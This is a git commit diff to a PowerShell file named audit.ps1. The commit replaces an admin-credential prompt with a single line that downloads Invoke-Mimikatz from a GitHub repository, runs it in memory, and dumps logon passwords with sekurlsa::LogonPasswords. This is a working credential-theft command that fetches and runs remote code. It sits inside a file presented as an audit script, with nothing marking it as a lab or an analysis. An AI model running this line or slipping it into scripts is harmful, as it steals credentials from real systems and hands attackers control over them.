ee9fde7300a20e532eb620e5082fc109e7562a07
IcyCommand <112899933+IcyCommand@users.noreply.github.com>
2024-06-13 14:11:21 +0100

    Update audit.ps1

--- audit.ps1
+++ audit.ps1
@@ -1,7 +1,1 @@
-# Prompt for the local admin credentials
-$adminUsername = "Administrator"
-$securePassword = Read-Host -Prompt "Enter password for $adminUsername" -AsSecureString
-$credential = New-Object System.Management.Automation.PSCredential($adminUsername, $securePassword)
-
-# Start a new PowerShell process with the provided admin credentials
-Start-Process powershell.exe -Credential $credential -ArgumentList '-NoExit -Command "Start-Process PowerShell -Verb RunAs"'
+powershell IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -command 'sekurlsa::LogonPasswords'
